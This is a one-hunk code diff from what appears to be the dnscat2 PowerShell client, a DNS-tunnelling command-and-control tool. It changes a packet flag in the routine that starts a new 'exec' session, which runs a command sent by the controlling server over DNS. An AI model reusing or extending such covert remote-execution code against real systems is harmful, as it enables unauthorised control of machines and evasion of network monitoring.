@@ -360,7 +360,7 @@ function Update-Dnscat2CommandSession ($Session) {
                 try {
                     $NewSessionName = $Session.CommandFields.split("00")[0]
                     $NewSessionCommand = Convert-HexToString $Session.CommandFields.split("00")[2]
-                    $NewSession = Start-Dnscat2Session (New-RandomDNSField 4) ("0002" + $NewSessionName + '00') $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.LookupTypes $Session.Delay "exec" $NewSessionCommand
+                    $NewSession = Start-Dnscat2Session (New-RandomDNSField 4) ("0001" + $NewSessionName + '00') $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.LookupTypes $Session.Delay "exec" $NewSessionCommand
                     $Session.NewSessions.Add($NewSession.SessionId, $NewSession)
                     $PacketLengthField = ([Convert]::ToString((4 + $NewSession.SessionId.Length/2),16)).PadLeft(8, '0')
                     $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0002" + $NewSession.SessionId)
